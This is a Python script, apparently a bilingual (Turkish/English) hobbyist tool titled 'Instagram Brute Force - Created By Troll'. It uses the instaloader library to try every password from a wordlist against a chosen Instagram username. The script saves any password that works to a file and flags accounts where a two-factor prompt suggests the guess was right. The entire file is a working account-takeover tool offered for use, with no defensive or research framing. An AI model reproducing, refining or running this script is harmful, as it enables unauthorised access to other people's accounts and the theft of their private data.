import instaloader
import time
import os
import sys

LANG = "tr" #ana dil

#dil kismi
texts = {
    "select_language": {
        "tr": "Dil Seçiniz / Select Language:\n1) Türkçe\n2) English",
        "en": "Select Language / Dil Seçiniz:\n1) Turkish\n2) English"
    },
    "selected_mode": {
        "tr": "🚦 Seçilen Mod",
        "en": "🚦 Selected Mode"
    },
    "profile_link": {
        "tr": "🔗 Hedef Profil",
        "en": "🔗 Target Profile"
    },
    "enter_username": {
        "tr": "👤 Kullanıcı Adı: ",
        "en": "👤 Username: "
    },
    "enter_wordlist": {
        "tr": "📂 Parola Listesi Dosyası: ",
        "en": "📂 Password List File: "
    },
    "mode_select": {
        "tr": "Mod Seçiniz:\n1) ⚡ Hızlı Mod (1 saniye bekleme)\n2) 🐢 Yavaş Mod (10 saniye bekleme + ekstra istikrar)\n→ Seçiminiz (1/2): ",
        "en": "Select Mode:\n1) ⚡ Fast Mode (1 second delay)\n2) 🐢 Slow Mode (10 second delay + better success)\n→ Your Choice (1/2): "
    },
    "invalid_mode": {
        "tr": "[!] Geçersiz seçim. Hızlı mod seçildi.",
        "en": "[!] Invalid choice. Fast mode selected."
    },
    "file_not_found": {
        "tr": "[!] HATA: Dosya bulunamadı!",
        "en": "[!] ERROR: File not found!"
    },
    "total_passwords": {
        "tr": "[+] Toplam {n} şifre denenecek...\n",
        "en": "[+] Total {n} passwords to try...\n"
    },
    "trying_password": {
        "tr": "[{c}/{t}] 🔐 Deneniyor: {pw}",
        "en": "[{c}/{t}] 🔐 Trying: {pw}"
    },
    "success": {
        "tr": "\n✅ BAŞARILI GİRİŞ! → Şifre: {pw}",
        "en": "\n✅ LOGIN SUCCESSFUL! → Password: {pw}"
    },
    "wrong_password": {
        "tr": "❌ Hatalı parola.\n", #sifre yanlis
        "en": "❌ Wrong password.\n"
    },
    "2fa_detected": {
        "tr": "🔐 2FA aktif! Şifre doğru olabilir: {pw}",
        "en": "🔐 2FA enabled! Password might be correct: {pw}"
    },
    "connection_error": {
        "tr": "⚠️  Bağlantı hatası. Bekleniyor...",
        "en": "⚠️  Connection error. Waiting..."
    },
    "unknown_error": {
        "tr": "⚠️  Beklenmeyen hata: ",
        "en": "⚠️  Unexpected error: "
    },
    "none_worked": {
        "tr": "\n🚫 Hiçbir şifre doğru çıkmadı.",
        "en": "\n🚫 None of the passwords worked."
    }
}

def _(key, **kwargs):
    text = texts.get(key, {}).get(LANG, "")
    return text.format(**kwargs)

def clear(): os.system('cls' if os.name == 'nt' else 'clear')

def banner(username=None, mode=None):
    clear()
    print("""
 ██████   █████                                            █████            
░░██████ ░░███                                            ░░███             
 ░███░███ ░███   ██████  █████ █████ ████████  █████ ████ ███████    ██████ 
 ░███░░███░███  ███░░███░░███ ░░███ ░░███░░███░░███ ░███ ░░░███░    ███░░███
 ░███ ░░██████ ░███████  ░███  ░███  ░███ ░░░  ░███ ░███   ░███    ░███████ 
 ░███  ░░█████ ░███░░░   ░░███ ███   ░███      ░███ ░███   ░███ ███░███░░░  
 █████  ░░█████░░██████   ░░█████    █████     ░░████████  ░░█████ ░░██████ 
░░░░░    ░░░░░  ░░░░░░     ░░░░░    ░░░░░       ░░░░░░░░    ░░░░░   ░░░░░░  

           🛡️ Instagram Brute Force - Created By Troll

""") #ascii art

    if username:
        print(f"\n{_('profile_link')}: https://www.instagram.com/{username}/")
    if mode:
        print(f"{_('selected_mode')}: {mode}\n")

def choose_language(): 
    global LANG
    clear()
    print(_( "select_language"))
    lang_choice = input("→ Seçim / Choice (1/2): ").strip()
    LANG = "tr" if lang_choice == "1" else "en"

def choose_mode():
    choice = input(_( "mode_select")).strip()
    if choice == "1":
        return 1, "⚡ Fast Mode" if LANG == "en" else "⚡ Hızlı Mod"
    elif choice == "2":
        return 10, "🐢 Slow Mode" if LANG == "en" else "🐢 Yavaş Mod"
    else:
        print(_( "invalid_mode"))
        return 1, "⚡ Fast Mode" if LANG == "en" else "⚡ Hızlı Mod"

def main():
    choose_language()
    banner()
    username = input(_( "enter_username")).strip()
    wordlist_path = input(_( "enter_wordlist")).strip()
    delay, mode_name = choose_mode()

    banner(username, mode_name)

    try:
        with open(wordlist_path, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(_( "file_not_found"))
        sys.exit(1)

    print(_( "total_passwords", n=len(passwords)))
    L = instaloader.Instaloader()

    for count, password in enumerate(passwords, 1):
        print(_( "trying_password", c=count, t=len(passwords), pw=password))

        try:
            L.login(username, password)
            print(_( "success", pw=password))
            with open("found_password.txt", "w") as result:
                result.write(f"{username}:{password}\n")
            break

        except instaloader.exceptions.BadCredentialsException:
            print(_( "wrong_password"))
        except instaloader.exceptions.TwoFactorAuthRequiredException:
            print(_( "2fa_detected", pw=password))
            break
        except instaloader.exceptions.ConnectionException:
            print(_( "connection_error"))
            time.sleep(10) #10 saniye beklet
            continue
        except Exception as e:
            print(_( "unknown_error") + str(e))
            time.sleep(5) # 5 saniye beklet
            continue

        time.sleep(delay)
    else:
        print(_( "none_worked"))

if __name__ == "__main__":
    main()
